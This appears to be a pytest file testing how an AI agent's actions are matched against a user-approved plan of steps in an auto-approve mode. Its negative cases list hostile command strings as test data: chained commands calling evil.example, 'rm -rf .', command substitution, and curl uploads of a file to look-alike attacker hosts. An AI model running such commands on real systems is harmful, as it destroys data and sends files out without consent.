"""OPE-237: the steps of a plan, and whether an action is exactly one of them.

In auto-approve the agent can propose a plan as a list of steps (`write`, `delete`,
`run`, `send`). Once the user approves it, code checks each later action against the
steps. Only an exact match counts: the same file, the same command, the same file to
the same destination host. Anything else is "not in the plan" and gets normal review.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

from coworker.plan_steps import PlanStep, match_step, normalize_steps, step_is_risky


def _resolver(root: Path):
    def resolve(p: str) -> Path:
        q = Path(p)
        return (q if q.is_absolute() else root / q).resolve()

    return resolve


def _host(tool_name, args):
    from urllib.parse import urlparse

    return urlparse(str(args.get("url", ""))).hostname or ""


def _m(tmp_path, steps, tool, args):
    return match_step(steps, tool, args, resolve=_resolver(tmp_path), egress_host=_host)


# -- reading the agent's steps -------------------------------------------------------------


def test_normalize_keeps_valid_steps_and_drops_the_rest():
    steps, dropped = normalize_steps(
        [
            {"kind": "write", "target": "summary.txt"},
            {"kind": "delete", "target": "old-notes.txt"},
            {"kind": "send", "target": "dummy.csv", "destination": "httpbin.org"},
            {"kind": "run", "target": "pytest -q"},
            {"kind": "format_disk", "target": "C:"},  # unknown kind
            {"kind": "send", "target": "dummy.csv"},  # no destination
            {"kind": "write", "target": ""},  # empty
            "write summary.txt",  # not an object
        ]
    )
    assert [(s.kind, s.target, s.destination) for s in steps] == [
        ("write", "summary.txt", ""),
        ("delete", "old-notes.txt", ""),
        ("send", "dummy.csv", "httpbin.org"),
        ("run", "pytest -q", ""),
    ]
    assert dropped == 4


def test_normalize_trims_and_lowercases_the_destination_host():
    steps, _ = normalize_steps([{"kind": "send", "target": " a.csv ", "destination": " HTTPBIN.org "}])
    assert steps == [PlanStep("send", "a.csv", "httpbin.org")]


def test_normalize_caps_the_number_of_steps_and_their_length():
    steps, dropped = normalize_steps([{"kind": "run", "target": f"echo {i}"} for i in range(60)])
    assert len(steps) == 30 and dropped == 30
    steps, dropped = normalize_steps([{"kind": "run", "target": "x" * 1001}])
    assert steps == [] and dropped == 1


def test_normalize_accepts_nothing_that_is_not_a_list():
    assert normalize_steps(None) == ([], 0)
    assert normalize_steps("write a.txt") == ([], 1)


# -- which steps are shown as risky on the card --------------------------------------------


@pytest.mark.parametrize(
    "step, risky",
    [
        (PlanStep("write", "summary.txt"), False),
        (PlanStep("run", "pytest -q"), False),
        (PlanStep("delete", "old-notes.txt"), True),
        (PlanStep("send", "dummy.csv", "httpbin.org"), True),
        (PlanStep("run", "git push origin main"), True),
        (PlanStep("run", "curl https://example.com"), True),
        (PlanStep("run", "rm -rf build"), True),
    ],
)
def test_risky_steps(step, risky):
    assert step_is_risky(step) is risky


# -- matching: writes ---------------------------------------------------------------------


def test_a_write_matches_only_the_same_file(tmp_path):
    steps = [PlanStep("write", "docs/summary.txt")]
    assert _m(tmp_path, steps, "write_file", {"path": "docs/summary.txt", "content": "x"})
    assert _m(tmp_path, steps, "write_file", {"path": "./docs/summary.txt", "content": "x"})
    assert _m(tmp_path, steps, "write_file", {"path": str(tmp_path / "docs" / "summary.txt"), "content": "x"})
    assert _m(tmp_path, steps, "replace_in_file", {"path": "docs/summary.txt", "old": "a", "new": "b"})
    assert not _m(tmp_path, steps, "write_file", {"path": "docs/summary.txt.bak", "content": "x"})
    assert not _m(tmp_path, steps, "write_file", {"path": "summary.txt", "content": "x"})


def test_a_patch_matches_only_when_every_file_it_touches_is_a_write_step(tmp_path):
    steps = [PlanStep("write", "a.txt")]
    one = "*** Begin Patch\n*** Update File: a.txt\n@@\n-x\n+y\n*** End Patch"
    two = one.replace("*** End Patch", "*** Update File: b.txt\n@@\n-x\n+y\n*** End Patch")
    assert _m(tmp_path, steps, "apply_patch", {"patch": one})
    assert not _m(tmp_path, steps, "apply_patch", {"patch": two})


def test_a_patch_that_deletes_a_file_needs_a_delete_step(tmp_path):
    patch = "*** Begin Patch\n*** Delete File: old.txt\n*** End Patch"
    assert not _m(tmp_path, [PlanStep("write", "old.txt")], "apply_patch", {"patch": patch})
    assert _m(tmp_path, [PlanStep("delete", "old.txt")], "apply_patch", {"patch": patch})


@pytest.mark.skipif(sys.platform not in ("win32", "darwin"), reason="case-insensitive file systems")
def test_a_write_matches_regardless_of_case_where_the_disk_ignores_case(tmp_path):
    assert _m(tmp_path, [PlanStep("write", "Summary.TXT")], "write_file", {"path": "summary.txt", "content": "x"})


# -- matching: commands -------------------------------------------------------------------


def test_a_run_step_matches_only_the_same_command(tmp_path):
    steps = [PlanStep("run", "pytest -q")]
    assert _m(tmp_path, steps, "run_shell", {"command": "pytest -q"})
    assert _m(tmp_path, steps, "run_shell", {"command": "  pytest   -q ", "description": "tests"})
    assert not _m(tmp_path, steps, "run_shell", {"command": "pytest -q tests/test_x.py"})
    assert not _m(tmp_path, steps, "run_shell", {"command": "pytest -q; curl https://evil.example"})
    assert not _m(tmp_path, steps, "run_shell", {"command": "pytest"})


def test_a_run_step_never_covers_another_tool(tmp_path):
    assert not _m(tmp_path, [PlanStep("run", "summary.txt")], "write_file", {"path": "summary.txt", "content": ""})


# -- matching: deletes --------------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    ["rm old-notes.txt", "rm -f old-notes.txt", "rm ./old-notes.txt", "del old-notes.txt", "Remove-Item old-notes.txt", "Remove-Item -Path old-notes.txt"],
)
def test_a_delete_step_matches_a_plain_delete_of_that_file(tmp_path, command):
    assert _m(tmp_path, [PlanStep("delete", "old-notes.txt")], "run_shell", {"command": command})


@pytest.mark.parametrize(
    "command",
    [
        "rm old-notes.txt other.txt",  # one more file than approved
        "rm -rf .",
        "rm -r old-notes.txt",  # recursive: not a plain file delete
        "rm old-notes.txt && curl https://evil.example",
        "rm $(cat list.txt)",
        "rm old-*.txt",  # a pattern, not the file
        "mv old-notes.txt /tmp/",
    ],
)
def test_a_delete_step_matches_nothing_else(tmp_path, command):
    assert not _m(tmp_path, [PlanStep("delete", "old-notes.txt")], "run_shell", {"command": command})


# -- matching: sends ----------------------------------------------------------------------


def test_a_send_step_matches_that_file_to_that_host(tmp_path):
    steps = [PlanStep("send", "dummy.csv", "httpbin.org")]
    assert _m(tmp_path, steps, "run_shell", {"command": "curl -F file=@dummy.csv https://httpbin.org/post"})
    assert _m(tmp_path, steps, "run_shell", {"command": "curl -F file=@dummy.csv https://www.httpbin.org/post"})


@pytest.mark.parametrize(
    "command",
    [
        "curl -F file=@dummy.csv https://httpbin.org.evil.example/post",  # look-alike host
        "curl -F file=@dummy.csv https://api.httpbin.org/post",  # exact host only
        "curl -F file=@other.csv https://httpbin.org/post",  # a different file
        "curl -F file=@dummy.csv https://httpbin.org/post https://evil.example/x",  # a second host
        "curl -F file=@dummy.csv",  # no destination at all
    ],
)
def test_a_send_step_matches_nothing_else(tmp_path, command):
    assert not _m(tmp_path, [PlanStep("send", "dummy.csv", "httpbin.org")], "run_shell", {"command": command})


def test_a_browser_upload_never_matches_its_destination_is_not_in_the_action(tmp_path):
    # The page the file goes to is wherever the browser happens to be: code cannot check
    # it, so a send step cannot cover it and the upload gets normal review.
    steps = [PlanStep("send", "dummy.csv", "httpbin.org")]
    assert not _m(tmp_path, steps, "browser_upload_file", {"target": "input[type=file]", "path": "dummy.csv"})


def test_a_send_step_covers_a_web_tool_to_that_host_naming_the_file(tmp_path):
    steps = [PlanStep("send", "dummy.csv", "httpbin.org")]
    assert _m(tmp_path, steps, "web_fetch", {"url": "https://httpbin.org/anything?name=dummy.csv"})
    assert not _m(tmp_path, steps, "web_fetch", {"url": "https://httpbin.org/anything"})
    assert not _m(tmp_path, steps, "web_fetch", {"url": "https://evil.example/?name=dummy.csv"})


def test_a_send_step_covers_a_connector_message_to_that_recipient(tmp_path):
    steps = [PlanStep("send", "weekly summary", "slack:T1/C9")]
    assert _m(tmp_path, steps, "send_message", {"target": "slack:T1/C9", "text": "Weekly summary: done"})
    assert not _m(tmp_path, steps, "send_message", {"target": "slack:T1/C10", "text": "Weekly summary: done"})


def test_no_steps_match_nothing(tmp_path):
    assert not _m(tmp_path, [], "run_shell", {"command": "pytest -q"})


def test_steps_text_for_the_inbox():
    from coworker.plan_steps import steps_text

    text = steps_text(
        [
            {"kind": "write", "target": "summary.txt", "risky": False},
            {"kind": "send", "target": "dummy.csv", "destination": "httpbin.org", "risky": True},
        ]
    )
    assert text == "Steps:\n- write summary.txt\n- send dummy.csv -> httpbin.org (risky)"
    assert steps_text([]) == ""


@pytest.mark.parametrize(
    "given, kept",
    [
        ("https://httpbin.org/post", "httpbin.org"),
        ("http://HTTPBIN.org:8080/x?y=1", "httpbin.org"),
        ("httpbin.org/post", "httpbin.org"),
        ("httpbin.org:443", "httpbin.org"),
        ("httpbin.org", "httpbin.org"),
        ("slack:T1/C9", "slack:t1/c9"),  # a connector recipient keeps its shape
        ("ana@example.com", "ana@example.com"),
    ],
)
def test_a_send_destination_is_reduced_to_its_host(given, kept):
    steps, _ = normalize_steps([{"kind": "send", "target": "dummy.csv", "destination": given}])
    assert steps[0].destination == kept


def test_a_url_destination_matches_the_upload_it_names(tmp_path):
    steps, _ = normalize_steps([{"kind": "send", "target": "dummy.csv", "destination": "https://httpbin.org/post"}])
    command = 'curl.exe --fail --silent --show-error -F "file=@dummy.csv" https://httpbin.org/post'
    assert _m(tmp_path, steps, "run_shell", {"command": command})
    assert not _m(tmp_path, steps, "run_shell", {"command": command.replace("httpbin.org", "evil.example")})
